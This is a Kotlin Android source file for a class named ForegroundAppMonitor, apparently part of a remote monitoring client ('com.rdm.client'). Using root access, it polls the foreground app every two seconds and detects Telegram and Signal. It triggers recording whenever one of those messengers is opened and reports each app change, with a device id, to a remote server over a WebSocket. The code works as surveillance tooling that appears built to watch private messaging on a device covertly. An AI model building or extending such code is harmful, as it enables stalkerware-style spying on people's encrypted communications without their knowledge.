package com.rdm.client

import android.content.Context
import android.util.Log
import kotlinx.coroutines.*
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import org.json.JSONObject

class ForegroundAppMonitor(
    private val context: Context,
    private val rootExecutor: RootExecutor,
    private val webSocketClient: WebSocketClient,
    private val onRecordingTrigger: (String) -> Unit,
    private val onRecordingStop: () -> Unit,
    private val onAppChanged: (String?) -> Unit = {}
) {
    private val TAG = "ForegroundAppMonitor"

    private val _currentApp = MutableStateFlow<ForegroundAppInfo?>(null)
    val currentApp: StateFlow<ForegroundAppInfo?> = _currentApp.asStateFlow()

    private var monitoringJob: Job? = null
    private var isRunning = false
    private val checkIntervalMs = 2000L // Check every 2 seconds

    private var lastPackage: String? = null
    private val recordableApps = mutableSetOf<String>()
    private var isRecording = false

    // App detector for Telegram/Signal
    private val appDetector = AppDetector(context)

    suspend fun start() {
        if (isRunning) {
            Log.d(TAG, "Monitor already running")
            return
        }

        isRunning = true

        // Detect installed Telegram/Signal apps
        val detectedResult = appDetector.detectApps()
        if (detectedResult.isSuccess) {
            val detectedApps = detectedResult.getOrNull() ?: emptyMap()
            recordableApps.addAll(appDetector.getRecordablePackages())

            Log.d(TAG, "Loaded ${recordableApps.size} recordable apps: $recordableApps")
            Log.d(TAG, "Detected apps: ${detectedApps.values.map { it.appName }}")
        } else {
            Log.e(TAG, "Failed to detect apps")
        }

        Log.d(TAG, "Starting foreground app monitor (interval: ${checkIntervalMs}ms)")

        monitoringJob = CoroutineScope(Dispatchers.IO).launch {
            while (isRunning) {
                try {
                    checkForegroundApp()
                } catch (e: Exception) {
                    Log.e(TAG, "Error checking foreground app", e)
                }
                delay(checkIntervalMs)
            }
        }
    }

    fun stop() {
        if (!isRunning) {
            return
        }

        isRunning = false
        monitoringJob?.cancel()
        monitoringJob = null

        // Stop recording if active
        if (isRecording) {
            Log.d(TAG, "Stopping recording (monitor stopped)")
            onRecordingStop()
            isRecording = false
        }

        Log.d(TAG, "Foreground app monitor stopped")
    }

    private suspend fun checkForegroundApp() {
        val appInfo = rootExecutor.getForegroundAppInfo()

        // Only process if app has changed
        if (appInfo.packageName != null && appInfo.packageName != lastPackage) {
            lastPackage = appInfo.packageName
            _currentApp.value = appInfo

            Log.d(TAG, "Foreground app changed: ${appInfo.packageName} (${appInfo.activityName})")
            sendForegroundAppUpdate(appInfo)

            // Notify UI about app change
            onAppChanged(appInfo.packageName)

            // Check if we should start/stop recording
            handleRecordingForApp(appInfo.packageName)
        }
    }

    private fun handleRecordingForApp(packageName: String?) {
        if (packageName == null) return

        val shouldRecord = isRecordableApp(packageName)

        Log.d(TAG, "App: $packageName, Should record: $shouldRecord, Currently recording: $isRecording")

        if (shouldRecord && !isRecording) {
            // Start recording when app opens
            val appName = appDetector.getAppName(packageName) ?: packageName
            Log.d(TAG, "Starting recording for app: $appName ($packageName)")
            isRecording = true
            onRecordingTrigger(packageName)
        } else if (!shouldRecord && isRecording) {
            // Stop recording when app closes
            Log.d(TAG, "Stopping recording (app changed to non-recordable app)")
            isRecording = false
            onRecordingStop()
        }
    }

    fun isRecordableApp(packageName: String): Boolean {
        return packageName in recordableApps
    }

    fun getRecordableApps(): Set<String> {
        return recordableApps.toSet()
    }

    fun addRecordableApp(packageName: String) {
        if (packageName !in recordableApps) {
            recordableApps.add(packageName)
            Log.d(TAG, "Added recordable app: $packageName")
        }
    }

    fun removeRecordableApp(packageName: String) {
        if (packageName in recordableApps) {
            recordableApps.remove(packageName)
            Log.d(TAG, "Removed recordable app: $packageName")
        }
    }

    private fun sendForegroundAppUpdate(appInfo: ForegroundAppInfo) {
        try {
            val isRecordable = appInfo.packageName?.let { isRecordableApp(it) } ?: false

            val message = JSONObject().apply {
                put("type", "foreground_app")
                put("device_id", webSocketClient.deviceId)
                put("data", JSONObject().apply {
                    put("package_name", appInfo.packageName)
                    put("activity_name", appInfo.activityName)
                    put("timestamp", appInfo.timestamp)
                    put("is_recording", isRecording)
                    put("is_recordable", isRecordable)
                })
            }
            webSocketClient.send(message.toString())
        } catch (e: Exception) {
            Log.e(TAG, "Failed to send foreground app update", e)
        }
    }

    fun getCurrentForegroundApp(): ForegroundAppInfo? {
        return _currentApp.value
    }

    fun isMonitoring(): Boolean {
        return isRunning
    }

    fun isCurrentlyRecording(): Boolean {
        return isRecording
    }

    fun getCurrentAppName(): String? {
        return _currentApp.value?.packageName?.let { appDetector.getAppName(it) }
    }
}
